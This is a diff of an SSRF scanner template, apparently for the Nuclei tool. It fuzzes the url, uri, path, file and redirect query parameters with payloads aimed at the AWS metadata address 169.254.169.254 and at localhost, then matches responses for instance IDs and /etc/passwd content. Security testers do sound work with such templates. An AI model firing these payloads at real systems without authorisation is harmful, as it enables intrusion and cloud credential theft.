@@ -1,37 +1,37 @@
-id: nawab-ssrf-internal-found
+id: nawab-smart-ssrf
 
 info:
-  name: Nawab-SSRF-Internal-Discovery
+  name: 🛸 Nawab-Smart-SSRF-Scanner 🛸
   author: thenawabx
   severity: critical
-  description: Detects Server Side Request Forgery and internal metadata exposure with confirmed hits.
-  tags: nawab-elite, ssrf, critical
 
 http:
   - method: GET
     path:
-      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
-      - "{{BaseURL}}/?uri=http://169.254.169.254/latest/meta-data/"
-      - "{{BaseURL}}/?file=http://localhost:80"
-      - "{{BaseURL}}/?redirect=http://127.0.0.1:80"
+      - "{{BaseURL}}"
 
-    matchers-condition: or
+    payloads:
+      ssrf_targets:
+        - "http://169.254.169.254/latest/meta-data/"
+        - "http://localhost:80"
+
+    fuzzing:
+      - part: query
+        keys:
+          - "url"
+          - "uri"
+          - "path"
+          - "file"
+          - "redirect"
+        type: replace
+        fuzz:
+          - "{{ssrf_targets}}"
+
     matchers:
-      # AWS Cloud Metadata Confirmation
       - type: regex
-        name: "!!! [FOUND] SSRF-CRITICAL: AWS-METADATA-EXPOSED !!!"
+        name: "🛸🛸 [FOUND] SSRF-CRITICAL: INTERNAL-HIT 🛸🛸"
         regex:
           - "ami-id"
           - "instance-id"
-          - "local-hostname"
-          - "public-ipv4"
-        part: body
-
-      # Localhost / Internal Access Confirmation
-      - type: regex
-        name: "!!! [FOUND] SSRF-CONFIRMED: LOCALHOST-REACHED !!!"
-        regex:
           - "root:x:0:0"
-          - "Index of /"
-          - "Apache Status"
         part: body
